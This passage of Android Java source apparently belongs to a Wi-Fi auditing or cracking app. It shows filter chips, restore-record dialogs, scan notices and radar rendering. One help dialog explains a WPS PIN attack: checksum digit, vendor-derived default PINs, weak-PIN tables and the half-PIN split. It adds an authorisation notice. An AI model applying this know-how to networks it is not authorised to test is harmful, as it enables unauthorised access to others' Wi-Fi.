    private static final int FILTER_ALL = 0, FILTER_SECURE = 1,
            FILTER_OPEN = 2, FILTER_HIDDEN = 3, FILTER_WPS = 4;
    private int netFilter = FILTER_ALL;
    private LinearLayout filterRow;
    /** 筛选片集合（下标与 {@link #filterChipModes} 对齐，用于刷新选中态）。 */
    private final java.util.List<TextView> filterChips = new java.util.ArrayList<>();
    private final java.util.List<Integer> filterChipModes = new java.util.ArrayList<>();
    /** 信道建议卡的容器（有建议才显示）与它的标题。 */
    private LinearLayout adviceBoxRef;
    private TextView adviceTitle;

    /**
     * 筛选片。选中态＝实心琥珀 + 深色字；未选中＝暗底 + 描边 + 弱字。
     *
     * <p>改版前这里没有任何选中反馈：点了「开放」之后片子长得一模一样，
     * 用户只能靠列表内容猜当前生效的是哪个筛选。
     */
    private TextView filterChip(String label, int mode) {
        TextView t = new TextView(this);
        t.setText(label);
        t.setTextSize(AmberTheme.FS_BODY);
        t.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        t.setPadding(px(14), px(9), px(14), px(9));
        t.setOnClickListener(v -> {
            netFilter = mode;
            renderFilterChips();
            renderRecords(lastRecords);
        });
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.rightMargin = px(8);
        t.setLayoutParams(lp);
        filterChips.add(t);
        filterChipModes.add(mode);
        return t;
    }

    /** 按当前 netFilter 刷新筛选片外观。 */
    private void renderFilterChips() {
        for (int i = 0; i < filterChips.size(); i++) {
            TextView t = filterChips.get(i);
            boolean on = filterChipModes.get(i) == netFilter;
            t.setTextColor(on ? ON_ACCENT : AmberTheme.TEXT_DIM);
            t.setBackground(on
                    ? io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(
                            ACCENT, dp(AmberTheme.RADIUS_CHIP))
                    : io.github.wlmosv_png.wpaforge.ui.UiKit.rippleStroked(
                            AmberTheme.CARD_2, BTN_2ND_EDGE, dp(AmberTheme.RADIUS_CHIP), dp(0.8f)));
        }
    }

    private boolean passFilter(NetRecord r) {
        switch (netFilter) {
            case FILTER_WPS:
                return r.wpsSupported;
            case FILTER_SECURE:
                return r.security != NetRecord.Security.OPEN
                        && r.security != NetRecord.Security.WEP;
            case FILTER_OPEN:
                return r.security == NetRecord.Security.OPEN
                        || r.security == NetRecord.Security.WEP;
            case FILTER_HIDDEN:
                return r.isHidden();
            default:
                return true;
        }
    }

    /**
     * 小节标题：琥珀小字 + 拉开字距。
     *
     * <p>改版前是灰色正文色，页面上六段内容连成一片，滚动时看不出"这是新的一段"。
     * 现在统一走 {@link AmberTheme} 的强调色与字号档位（五个页面共用这一个方法，
     * 所以观感天然一致）。
     */
    /**
     * 刷新「恢复状态」卡片（1.9.28）。
     *
     * <p>每条记录给三件事：它是什么（目标 / 阶段 / 重试次数）、为什么失败、
     * 以及三个动作（重试恢复 / 清理记录 / 查看详情）。
     */
    /**
     * 队列隔离恢复：二次确认后执行 resolveQuarantine，并刷新界面。
     * 恢复完成（或失败）都以弹窗明确报告结果 —— 绝不静默。
     */
    private void confirmResolveQuarantine(
            final io.github.wlmosv_png.wpaforge.audit.TaskQueue.Role role) {
        String what = role == io.github.wlmosv_png.wpaforge.audit.TaskQueue.Role.BASE
                ? L.s("主文件（较新的一份）", "the base file")
                : L.s("备份文件", "the backup file");
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("确认恢复队列", "Restore queue"))
                .setMessage(L.s("确定用 " + what + " 恢复队列吗？\n"
                                + "另一份会保留为 .notchosen-<时间>，不会删除。",
                        "Restore the queue from " + what + "?\n"
                                + "The other copy is kept as .notchosen-<ts>, not deleted."))
                .setPositiveButton(L.s("恢复", "Restore"),
                        (d, w) -> new Thread(() -> {
                            final io.github.wlmosv_png.wpaforge.audit.TaskQueue.ReadResult r =
                                    io.github.wlmosv_png.wpaforge.audit.TaskQueue
                                            .resolveQuarantine(this, role);
                            runOnUiThread(() -> {
                                if (r.state == io.github.wlmosv_png.wpaforge.audit
                                        .TaskQueue.ReadState.COMPLETE) {
                                    android.widget.Toast.makeText(this,
                                            L.s("队列已恢复，共 " + r.tasks.size() + " 条任务",
                                                    "Queue restored, " + r.tasks.size() + " tasks"),
                                            android.widget.Toast.LENGTH_LONG).show();
                                } else {
                                    new android.app.AlertDialog.Builder(this)
                                            .setTitle(L.s("恢复失败", "Restore failed"))
                                            .setMessage(r.detail)
                                            .setPositiveButton(L.s("知道了", "OK"), null)
                                            .show();
                                }
                                refreshRestoreCard();
                            });
                        }, "wpaforge-resolve-quarantine").start())
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    private void refreshRestoreCard() {
        if (restoreList == null || restoreSummary == null) return;
        restoreList.removeAllViews();

        // ---- 队列隔离态（P0-2e）：必须先于 WiFi 配置恢复展示 ----
        // 此前队列被隔离时，这里只显示「没有待处理的恢复记录」，用户完全看不到
        // 队列已拒绝读写、任务永不消费的真相。隔离信息来自 TaskQueue.quarantineInfo。
        io.github.wlmosv_png.wpaforge.audit.TaskQueue.QuarantineInfo qi =
                io.github.wlmosv_png.wpaforge.audit.TaskQueue.quarantineInfo(this);
        if (qi != null) {
            TextView qTitle = new TextView(this);
            qTitle.setText(L.s("⚠ 队列数据待恢复 —— 破解任务已暂停消费",
                    "⚠ Queue data needs recovery - task consumption paused"));
            qTitle.setTextSize(AmberTheme.FS_TITLE);
            qTitle.setTextColor(0xFFFFB300);
            restoreList.addView(qTitle);

            StringBuilder qs = new StringBuilder();
            qs.append(L.s("队列文件存在两份数据（主文件与备份），无法自动判断哪份可信。",
                    "Both queue.json and its backup exist; which one is authoritative cannot be decided automatically."))
              .append('\n')
              .append(L.s("主文件 ", "base "))
              .append(qi.baseSize < 0 ? "?" : String.valueOf(qi.baseSize))
              .append("B")
              .append(qi.baseParsable
                      ? L.s(" · 可解析 " + qi.baseTaskCount + " 条任务",
                            " · parses " + qi.baseTaskCount + " tasks")
                      : L.s(" · 无法解析", " · unparsable"))
              .append('\n')
              .append(L.s("备份文件 ", "bak "))
              .append(qi.bakSize < 0 ? "?" : String.valueOf(qi.bakSize))
              .append("B")
              .append(qi.bakParsable
                      ? L.s(" · 可解析 " + qi.bakTaskCount + " 条任务",
                            " · parses " + qi.bakTaskCount + " tasks")
                      : L.s(" · 无法解析", " · unparsable"))
              .append('\n')
              .append(L.s("请选择要恢复的一份。未被选中的会保留为 .notchosen-<时间>。",
                    "Pick one to restore; the other is kept as .notchosen-<ts>."));

            TextView qDetail = new TextView(this);
            qDetail.setText(qs.toString());
            qDetail.setTextSize(AmberTheme.FS_BODY);
            qDetail.setTextColor(TEXT_DIM);
            qDetail.setLineSpacing(px(4), 1f);
            restoreList.addView(qDetail);

            // 恢复按钮：主文件 / 备份
            LinearLayout qBtns = new LinearLayout(this);
            qBtns.setOrientation(LinearLayout.HORIZONTAL);
            android.widget.Button qBase = new android.widget.Button(this);
            qBase.setText(L.s("恢复主文件", "Restore base"));
            qBase.setOnClickListener(v -> confirmResolveQuarantine(
                    io.github.wlmosv_png.wpaforge.audit.TaskQueue.Role.BASE));
            android.widget.Button qBak = new android.widget.Button(this);
            qBak.setText(L.s("恢复备份", "Restore backup"));
            qBak.setOnClickListener(v -> confirmResolveQuarantine(
                    io.github.wlmosv_png.wpaforge.audit.TaskQueue.Role.BAK));
            qBtns.addView(qBase);
            qBtns.addView(qBak);
            restoreList.addView(qBtns);
            // 有隔离态时仍继续渲染 WiFi 配置恢复记录，但不显示「没有待处理」的误导文案
            restoreSummary.setText(L.s("⚠ 队列数据待恢复（见上方）",
                    "⚠ Queue data needs recovery (see above)"));
            for (io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.Row r :
                    io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.rows()) {
                restoreList.addView(restoreRow(r));
            }
            return;
        }

        restoreSummary.setText(io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.summary());
        java.util.List<io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.Row> rows =
                io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.rows();
        if (rows.isEmpty()) {
            TextView hint = new TextView(this);
            hint.setText(L.s("没有待处理的恢复记录。任务收尾会先把原配置加密记下来，"
                            + "跑完再用它把网络配置放回去并回读确认 —— 目标不在覆盖范围内、"
                            + "此刻连着别的网，都不算恢复失败。",
                    "No pending restore records. Each run snapshots the original config first and "
                            + "puts it back afterwards with a read-back check; being out of range is "
                            + "not treated as a restore failure."));
            hint.setTextSize(AmberTheme.FS_BODY);
            hint.setTextColor(AmberTheme.TEXT_FAINT);
            hint.setLineSpacing(px(4), 1f);
            restoreList.addView(hint);
            return;
        }
        for (final io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.Row r : rows) {
            restoreList.addView(restoreRow(r));
        }
    }

    /** 单条恢复记录：一行摘要 + 原因 + 三个动作。 */
    private View restoreRow(final io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.Row r) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
        box.setPadding(px(14), px(12), px(14), px(12));

        TextView title = new TextView(this);
        title.setText(r.line());
        title.setTextSize(AmberTheme.FS_TITLE);
        title.setTextColor(TEXT);
        box.addView(title);

        TextView meta = new TextView(this);
        StringBuilder sb = new StringBuilder();
        sb.append(L.s("任务 ", "task ")).append(
                r.entry.taskId == null || r.entry.taskId.isEmpty() ? "?" : r.entry.taskId);
        if (r.entry.bssid != null && !r.entry.bssid.isEmpty()) {
            sb.append(" · ").append(r.entry.bssid);
        }
        sb.append(" · ").append(L.s("最近尝试 ", "last try ")).append(r.lastAttemptText);
        sb.append(" · ").append(L.s("剩余重试 ", "retries left ")).append(r.remaining);
        if (r.entry.residualRisk) {
            sb.append(" · ").append(L.s("可能有候选残留", "possible residual config"));
        }
        meta.setText(sb.toString());
        meta.setTextSize(AmberTheme.FS_STATE);
        meta.setTextColor(AmberTheme.TEXT_FAINT);
        meta.setLineSpacing(px(3), 1f);
        box.addView(meta, topGap(4));

        String why = r.reason();
        if (!why.isEmpty()) {
            TextView rsn = new TextView(this);
            rsn.setText(why);
            rsn.setTextSize(AmberTheme.FS_BODY);
            rsn.setTextColor(r.needsHuman ? DANGER : TEXT_DIM);
            rsn.setLineSpacing(px(3), 1f);
            box.addView(rsn, topGap(4));
        }

        LinearLayout acts = new LinearLayout(this);
        acts.setOrientation(LinearLayout.HORIZONTAL);
        // 三键**等宽 + 短文案**。
        // 旧写法三个按钮都是 WRAP_CONTENT：最右边那个被挤窄，文字折成两行、
        // 高度高出另外两个一截，整行看着是歪的。
        Button retry = AmberTheme.action(this, dp, L.s("重试", "Retry"), AmberTheme.BTN_PRIMARY);
        retry.setSingleLine(true);
        retry.setOnClickListener(v -> doRetryRestore(r));
        Button clear = AmberTheme.action(this, dp, L.s("清理", "Clear"), AmberTheme.BTN_NEUTRAL);
        clear.setSingleLine(true);
        clear.setOnClickListener(v -> confirmDiscardRestore(r));
        Button detail = AmberTheme.action(this, dp, L.s("详情", "Info"), AmberTheme.BTN_NEUTRAL);
        detail.setSingleLine(true);
        detail.setOnClickListener(v -> showRestoreDetail(r));
        acts.addView(retry, equalWeight(0));
        acts.addView(clear, equalWeight(px(8)));
        acts.addView(detail, equalWeight(px(8)));
        box.addView(acts, topGap(10));
        return box;
    }

    /**
     * 行内等宽控件参数（weight=1）。
     *
     * <p>配合短文案与 {@code setSingleLine(true)}，同一行的按钮才会等高、不折行 ——
     * 恢复状态卡片里那三个动作按钮就靠它排整齐。
     */
    private LinearLayout.LayoutParams equalWeight(int leftMarginPx) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.leftMargin = leftMarginPx;
        return lp;
    }

    /** 手动重试恢复（后台线程跑 shell，回来后刷新卡片）。 */
    private void doRetryRestore(final io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.Row r) {
        appendLog(L.s("手动重试恢复：", "manual restore retry: ") + r.line());
        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.RetryResult res =
                    io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.retryNow(r.entry);
            ui.post(() -> {
                appendLog((res.ok ? "✓ " : "✗ ") + res.message);
                Toast.makeText(this, res.message, Toast.LENGTH_LONG).show();
                refreshRestoreCard();
            });
        }, "wpaforge-restore-retry").start();
    }

    /** 清理记录：先只读安全检查 + 备份，再删；文案必须说清“不等于恢复配置”。 */
    private void confirmDiscardRestore(final io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.Row r) {
        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.audit.ConfigRestorer.Safety safe =
                    io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.safety(r.entry);
            ui.post(() -> new android.app.AlertDialog.Builder(this)
                    .setTitle(L.s("清理恢复记录", "Discard restore record"))
                    .setMessage(L.s("清理只删除这条恢复记录（会先备份），"
                                    + "不会改动系统里的网络配置 —— 因此不等于“恢复原 Wi-Fi 配置”。\n\n当前状态：",
                            "Discarding only removes this record (a backup is written first); it does "
                                    + "NOT touch the network config, so it is not a restore.\n\nNow: ")
                            + safe.describe())
                    .setNegativeButton(L.s("取消", "Cancel"), null)
                    .setPositiveButton(L.s("清理", "Discard"), (d, w) -> new Thread(() -> {
                        final io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.DiscardResult res =
                                io.github.wlmosv_png.wpaforge.audit.RestoreAdmin
                                        .discard(MainActivity.this, r.entry);
                        ui.post(() -> {
                            appendLog((res.removed ? "✓ " : "✗ ") + res.message);
                            Toast.makeText(this, res.message, Toast.LENGTH_LONG).show();
                            refreshRestoreCard();
                        });
                    }, "wpaforge-restore-discard").start())
                    .show());
        }, "wpaforge-restore-safety").start();
    }

    /** 查看详情：把记录的字段摊开（密文只显示长度，不显示内容）。 */
    private void showRestoreDetail(final io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.Row r) {
        io.github.wlmosv_png.wpaforge.audit.RestoreJournal.Entry e = r.entry;
        StringBuilder sb = new StringBuilder();
        sb.append(L.s("目标: ", "target: ")).append(e.ssid).append('\n');
        if (e.bssid != null && !e.bssid.isEmpty()) {
            sb.append("BSSID: ").append(e.bssid).append('\n');
        }
        sb.append(L.s("任务: ", "task: ")).append(e.taskId).append('\n');
        sb.append(L.s("阶段: ", "stage: ")).append(e.stageLabel())
                .append(" (").append(e.stage).append(")\n");
        sb.append(L.s("尝试: ", "attempts: ")).append(e.attempts).append('/')
                .append(io.github.wlmosv_png.wpaforge.audit.RestoreJournal.MAX_ATTEMPTS)
                .append(L.s("，最近 ", ", last ")).append(r.lastAttemptText).append('\n');
        sb.append(L.s("写回确认: ", "write-back confirmed: "))
                .append(e.writeBackConfirmed ? L.s("是", "yes") : L.s("否", "no")).append('\n');
        sb.append(L.s("观察到的连接: ", "connection observed: "))
                .append(e.connObserved ? L.s("已连上", "connected") : L.s("未观察到", "not seen"))
                .append(L.s("，有效 IP: ", ", valid IP: "))
                .append(e.ipObserved ? L.s("有", "yes") : L.s("无", "no")).append('\n');
        sb.append(L.s("候选残留风险: ", "residual risk: "))
                .append(e.residualRisk ? L.s("可能有", "possible") : L.s("无", "none")).append('\n');
        sb.append(L.s("原 netId: ", "original netId: ")).append(e.originalNetId)
                .append(L.s("，原口令: ", ", passphrase: "))
                .append(e.canReadd()
                        ? L.s("已加密保存(长度 ", "sealed (len ")
                            + e.sealedPsk.length() + ")"
                        : L.s("不可用", "unavailable"))
                .append('\n');
        if (e.failDetail != null && !e.failDetail.isEmpty()) {
            sb.append(L.s("失败详情: ", "failure: ")).append(e.failDetail).append('\n');
        }
        if (e.armedAt > 0) {
            sb.append(L.s("登记时间: ", "armed at: "))
                    .append(new java.text.SimpleDateFormat("MM-dd HH:mm:ss", java.util.Locale.US)
                            .format(new java.util.Date(e.armedAt))).append('\n');
        }
        sb.append(L.s("记录文件: ", "file: "))
                .append(io.github.wlmosv_png.wpaforge.audit.RestoreStoreFile.path(this));
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("恢复记录详情", "Restore record details"))
                .setMessage(sb.toString())
                .setPositiveButton(L.s("知道了", "OK"), null)
                .show();
    }

    /**
     * WPS PIN 弱点攻击 —— 问号帮助。
     *
     * <p>用项目统一的 {@link io.github.wlmosv_png.wpaforge.ui.NetDialog#textInfo} 打开，
     * 与其它功能页风格一致（不再用默认丑陋弹窗）。内容面向普通用户，不承诺成功率。
     */
    private void showWpsHelpDialog() {
        boolean zh = L.s("a", "b").equals("a");
        String body = zh
            ? "1. WPS PIN 是什么\n"
            + "   WPS（Wi-Fi Protected Setup）是路由器为方便用户连网提供的快捷配对方式。"
            + "其中一种方式要求输入一个 8 位数字 PIN。\n\n"
            + "2. PIN 弱点在哪里\n"
            + "   这 8 位中，第 8 位是前 7 位的校验位，不是随机信息；而且部分厂商会用 MAC 地址、"
            + "机型等可预测的信息推导出默认 PIN。因此理论上不需要穷举全部一亿种组合。\n\n"
            + "3. 四种策略分别是什么\n"
            + "   · 厂商算法：按目标 MAC/机型推导厂商可能使用的默认 PIN（有来源规则）。\n"
            + "   · 内置弱 PIN 表：常见的出厂默认 / 弱值（约 65 条）。\n"
            + "   · 我的列表：你自己导入的候选（从文件或粘贴）。\n"
            + "   · 拆半：先试前 4 位（1 万次）再试后 3 位（1 千次）。次数仍然很大、耗时很长。\n\n"
            + "4. 每种策略的适用条件与局限\n"
            + "   厂商算法只对“存在公开可预测规则”的机型有意义；弱 PIN 表只覆盖老设备；"
            + "导入列表取决于你的数据；拆半耗时长且可能触发路由器限流。"
            + "没有任何一种能保证成功。\n\n"
            + "5. 扫描到 WPS，不代表一定能验证\n"
            + "   “这个路由器广播了 WPS 信息”和“它现在允许我们从外部试 PIN”是两件事。"
            + "很多路由器默认关闭外部 PIN 输入，或只在按下机身上的 WPS 键后的短窗口内开放。\n\n"
            + "6. 本机 Root / 通道正常，不代表目标支持相关能力\n"
            + "   Root 和 supplicant 通道正常，只说明“本机具备执行条件”；"
            + "目标 AP 是否接受 PIN、是否处于配对待机，是目标自己决定的。\n\n"
            + "7. 未知 / 未验证 / 失败 / 成功分别代表什么\n"
            + "   · 未知：还没读到证据，不能下结论。\n"
            + "   · 未验证：观察到相关迹象，但缺少足够证据证明结果。\n"
            + "   · 失败：明确被拒或超时等否定结果。\n"
            + "   · 成功：需要协议层终局证据；本工具通常只能到“已观察到迹象”这一档，"
            + "不会把普通响应当成成功。\n\n"
            + "8. AP 可能有锁定与限流\n"
            + "   连续失败尝试可能让路由器进入 WPS 锁定或限流状态，需要等待或重启路由器。\n\n"
            + "9. 为什么不能把超时、关联状态当成成功证据\n"
            + "   关联成功、出现新网络配置、命令返回成功，都可能来自其它原因（例如手机连回了别的网）。"
            + "它们各自只能证明“发生过某件事”，不能证明“这条 PIN 是对的”。\n\n"
            + "10. 使用范围\n"
            + "    仅在你本人拥有、或已获得明确书面授权的网络上使用。"
            + "对他人网络进行尝试可能违法。\n"
            : "1. What is WPS PIN\n"
            + "   WPS is a convenience pairing feature; one mode uses an 8-digit PIN.\n\n"
            + "2. Where the weakness is\n"
            + "   The 8th digit is a checksum, and some vendors derive defaults from "
            + "predictable data (MAC/model). So the full space need not be exhausted.\n\n"
            + "3. The four strategies\n"
            + "   Vendor algorithms / built-in weak PIN table / your imported list / half-PIN split.\n\n"
            + "4. Limits\n"
            + "   Vendor rules only apply to known models; weak tables cover old gear; "
            + "your list depends on your data; half-PIN is slow and may trip rate limits. "
            + "None guarantees success.\n\n"
            + "5. Seeing WPS does not mean it can be verified\n"
            + "   Broadcasting WPS info is not the same as accepting external PIN input.\n\n"
            + "6. Local root/channel OK does not mean the AP supports it\n"
            + "   It only means your device can run the attempt.\n\n"
            + "7. Unknown / unverified / failed / success\n"
            + "   Unknown = no evidence yet; unverified = signs only; failed = denied; "
            + "success requires protocol-terminal evidence, which this tool usually cannot obtain.\n\n"
            + "8. APs may lock out or rate-limit\n\n"
            + "9. Why timeouts / association are not proof\n"
            + "   They can come from other causes and do not prove the PIN is correct.\n\n"
            + "10. Scope\n"
            + "    Use only on networks you own or are explicitly authorised to test.\n";

        try {
            io.github.wlmosv_png.wpaforge.ui.NetDialog.textInfo(this,
                    L.s("WPS PIN 弱点攻击 · 说明", "WPS PIN weakness attack · help"), body);
        } catch (Throwable t) {
            // 极端情况下退回最简提示，绝不无声失败
            android.widget.Toast.makeText(this,
                    L.s("帮助打开失败：" + t, "help failed: " + t), android.widget.Toast.LENGTH_LONG).show();
        }
    }

    private TextView sectionLabel(String s) {
        TextView t = new TextView(this);
        t.setText(s);
        t.setTextSize(AmberTheme.FS_LABEL);
        t.setTextColor(ACCENT);
        t.setLetterSpacing(0.16f);
        t.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        t.setPadding(px(4), px(20), 0, px(10));
        return t;
    }

    private final Scanner.Listener scanListener = new Scanner.Listener() {
        @Override
        public void onResults(List<NetRecord> records) {
            lastRecords = records;
            // 与上一次比对：刷新这件事才有信息量（新增/消失了几台）
            java.util.List<String> now = new java.util.ArrayList<>();
            for (NetRecord r : records) now.add(r.bssid);
            lastDiff = io.github.wlmosv_png.wpaforge.scan.ScanDiff.of(lastBssids, now);
            lastBssids = now;
            if (currentTab == 0) {
                renderRecords(records);
                updateRadarStatus();
            }
        }

        /**
         * 扫描器报上来的**原因**（只记录，不直接画到屏幕上）。
         *
         * <h3>为什么改成只记录（2026-11-02 用户截图）</h3>
         * 原来这里直接写文案 + 显示。而破解过程中引擎会不停断开／重连 WiFi，
         * 扫描结果时有时无 —— 于是这条提示**一闪一闪**地出现，
         * 用户看到的就是「破解时一下下显示 WiFi 未连接」。
         *
         * <p>更糟的是没人清它：WiFi 恢复、38 个热点就在雷达上转，
         * 红字还挂在下面（观测页那条「WiFi 未开启」就是上一轮留下的）。
         *
         * <p>现在统一由 {@link #refreshObserveNotice} 在每次渲染时**按真实状态**
         * 重新决定显示什么 —— 状态好了就消失，不需要谁来"记得清"。
         */
        @Override
        public void onNotice(String message, boolean isError) {
            lastScanNotice = message;
            lastScanNoticeIsError = isError;
            ui.post(() -> refreshObserveNotice(lastRecords));
        }
    };

    /**
     * 观测页提示条的**唯一决策点**。
     *
     * <h3>它替掉了三个各写各的写入点</h3>
     * 旧实现有三处直接写 observeNotice（Scanner 的 onNotice、renderRecords 里
     * 「暂时扫不到网络」、切页时清），互相不知道对方写过什么 —— 于是出现
     * 「WiFi 明明开着、38 个热点在雷达上，下面还挂着『WiFi 未开启』」，
     * 以及「破解时提示一闪一闪」。现在只有一个地方决定显示什么，
     * 而且**每次都按真实状态重算**，不需要谁来记得清除。
     *
     * <h3>优先级（自高到低）</h3>
     * <ol>
     *   <li><b>需要用户行动</b>（权限缺失 / 定位关闭 / WiFi 开关关闭）→ 红字。
     *       这三条都是「不处理就永远扫不到」，必须显眼。</li>
     *   <li><b>破解运行中</b> → 直接隐藏。引擎正在反复断开／重连 WiFi，
     *       这段时间扫不到网是**预期行为**，报警只会制造假故障。</li>
     *   <li><b>已有结果</b> → 隐藏（能扫到就说明前面的问题都过去了）。</li>
     *   <li><b>暂无结果</b> → 弱色一行说明原因（灰字，不用红）。</li>
     * </ol>
     */
    private void refreshObserveNotice(List<io.github.wlmosv_png.wpaforge.core.NetRecord> records) {
        if (observeNotice == null) return;

        String blocker = observeBlocker();
        if (blocker != null) {
            if (!blocker.contentEquals(observeNotice.getText())) observeNotice.setText(blocker);
            observeNotice.setTextColor(DANGER);
            if (observeNotice.getVisibility() != View.VISIBLE) {
                observeNotice.setVisibility(View.VISIBLE);
            }
            return;
        }

        // 破解中：不报「扫不到」——那是引擎在切网，不是故障
        if (io.github.wlmosv_png.wpaforge.CrackService.isRunning()) {
            observeNotice.setVisibility(View.GONE);
            return;
        }

        boolean hasRecords = records != null && !records.isEmpty();
        if (hasRecords) {
            observeNotice.setVisibility(View.GONE);
            return;
        }

        // 暂无结果：给一行弱提示，说清是「还在扫」还是「系统限流」
        String soft = (scanner != null && !scanner.lastScanAccepted())
                ? L.s("暂时扫不到网络 · ", "No networks yet · ") + scanner.scanGateLabel()
                : L.s("正在扫描…", "Scanning…");
        if (!soft.contentEquals(observeNotice.getText())) observeNotice.setText(soft);
        observeNotice.setTextColor(TEXT_DIM);
        if (observeNotice.getVisibility() != View.VISIBLE) {
            observeNotice.setVisibility(View.VISIBLE);
        }
    }

    /**
     * 当前**需要用户行动**的阻塞项；没有则返回 {@code null}。
     *
     * <p>关键是「按真实状态判断」而不是「信上一次的报错」—— 用户开了 WiFi，
     * 这里立刻就不再返回它，提示自然消失。
     */
    private String observeBlocker() {
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                    getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm == null) {
                return L.s("此设备无法访问 WiFi 服务", "This device cannot access the Wi-Fi service");
            }
            if (!wm.isWifiEnabled()) {
                return L.s("WiFi 未开启，请先打开 WiFi 开关",
                        "Wi-Fi is off — turn it on first");
            }
        } catch (Throwable ignored) { }

        // 定位开关：Android 10 起关着时系统不返回任何扫描结果
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                android.location.LocationManager lm = (android.location.LocationManager)
                        getSystemService(LOCATION_SERVICE);
                if (lm != null && !lm.isLocationEnabled()) {
                    return L.s("系统定位开关没打开：Android 10 起定位关着时系统不返回任何扫描结果。"
                                    + "请下拉通知栏打开「定位」再试。",
                            "Location is off: since Android 10 the system returns no scan "
                                    + "results while location is off. Turn Location on and retry.");
                }
            }
        } catch (Throwable ignored) { }

        // 定位权限（Android 12+ 需要 NEARBY_WIFI_DEVICES，运行时权限已由设置页申请）
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                return L.s("缺少定位权限：没有它系统不会返回扫描结果。",
                        "Missing location permission: without it the system returns "
                                + "no scan results.");
            }
        } catch (Throwable ignored) { }

        return null;
    }

    private void renderRecords(List<NetRecord> records) {
        if (radar == null || signalBoard == null || netList == null) return;

        // 应用筛选
        List<NetRecord> visible = new ArrayList<>();
        for (NetRecord r : records) {
            if (passFilter(r)) visible.add(r);
        }

        // 中心只放两个词：数字大、单位小。以前副文字带「· 最强 -41 dBm」，
        // 横向铺得太宽，会和内环的点/汇聚标撞在一起（截图里正压着）
        // 一个网络都扫不到时，把「为什么没有」说清楚：权限/Wi-Fi 关/系统限流
        // （有结果时不提限流 —— 那是噪音，用户也不该操心系统那 30 秒）
        refreshObserveNotice(records);

        radar.setCenterText(String.valueOf(visible.size()), L.s("个网络", "networks"));

        // 雷达：**一 AP 一点**，半径＝信号档位（越强越靠里），**方位角＝信道**。
        // 圆盘因此是一张频谱图：上半圆 2.4G 的 14 条信道、下半圆 5G 的 4 个 UNII 组，
        // 同一扇区里点越多＝那条信道越挤。信道不变方位就不变，
        // 所以刷新时点不会乱跳（旧的写法把「按信号排序的序号」当角度，一抖就换位）。
        List<NetRecord> byStrong = new ArrayList<>(visible);
        java.util.Collections.sort(byStrong, (a, b) -> b.rssi - a.rssi);
        RadarSweep.Blip[] blips = new RadarSweep.Blip[byStrong.size()];
        for (int i = 0; i < byStrong.size(); i++) {
            NetRecord r = byStrong.get(i);
            blips[i] = new RadarSweep.Blip(r.bssid, r.channel, r.is5Ghz, r.signalLevel(),
                    r.security != NetRecord.Security.OPEN
                            && r.security != NetRecord.Security.WEP);
        }
        radar.setBlips(blips);
        renderRadarStats(visible);
        renderSignalBoard(visible);

        netList.removeAllViews();
        /*
         * 列表按 SSID 聚合展示。
         *
         * Scanner 现在返回全量 AP（同一 SSID 可能有多个 BSSID），
         * 这里把同 SSID 的合成一组，组头带 AP 个数，组内按信号降序。
         * 单 AP 场景退化成原来的平铺样子，不多一个字。
         */
        List<SsidGroup.Group> groups = SsidGroup.group(visible);
        for (SsidGroup.Group g : groups) {
            netList.addView(groupHeader(g));
            for (NetRecord r : g.members) {
                netList.addView(netRow(r));
            }
        }
        if (visible.isEmpty()) {
            LinearLayout empty = AmberTheme.emptyBox(this, dp,
                    netFilter == FILTER_ALL
                            ? emptyTextWithDiag()
                            : L.s("当前筛选下没有匹配的网络。", "No networks match the current filter."),
                    netFilter == FILTER_ALL
                            ? L.s("点上面的「全部」可清除筛选", "Tap “All” above to clear the filter")
                            : L.s("换个筛选看看", "Try another filter"));
            netList.addView(empty);
        }

        // 信道占用图：横向条比纯文字更直观，直接替换掉原来的文字建议
        ChannelAnalyzer.Report rep = ChannelAnalyzer.analyze(records);
        if (channelBars != null) channelBars.setReport(rep);
        renderChannelAdvice(rep);
    }

    /**
     * 信道建议卡。
     *
     * ChannelAnalyzer 早就算出 recommended24 / recommended5，但结果只喂给了
     * ChannelBars 画图 —— 图上那条绿色高亮没有任何文字说明，用户得自己悟
     * "绿的是最空的"。这里把结论直白讲出来：换哪条、当前那条有多挤。
     *
     * 某频段一个 AP 都没有时不显示对应行，不用"无数据"占位。
     */
    private void renderChannelAdvice(ChannelAnalyzer.Report rep) {
        if (adviceCard == null || adviceBoxRef == null) return;
        if (rep == null) {
            adviceBoxRef.setVisibility(View.GONE);
            return;
        }

        StringBuilder sb = new StringBuilder();

        int shown = 0;
        if (rep.recommended24 > 0) {
            sb.append(L.s("2.4G 建议 ", "2.4G -> "))
              .append("ch").append(rep.recommended24)
              .append("  ").append(loadHint(rep.stats24, rep.recommended24))
              .append('\n');
            shown++;
        }
        if (rep.recommended5 > 0) {
